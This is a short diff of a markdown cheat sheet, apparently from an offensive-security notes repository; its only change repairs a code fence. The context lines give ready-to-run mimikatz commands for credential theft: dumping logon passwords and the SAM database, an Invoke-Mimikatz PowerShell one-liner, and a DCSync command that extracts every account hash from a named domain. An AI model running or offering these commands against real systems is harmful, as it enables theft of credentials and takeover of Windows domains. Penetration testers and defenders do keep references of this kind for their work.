@@ -4,7 +4,7 @@ mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump
 mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
 mimikatz "lsadump::sam"
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
-``
+```
 ### dcsync
 ```
 mimikatz lsadump::dcsync /domain:insomnia.io /all /csv
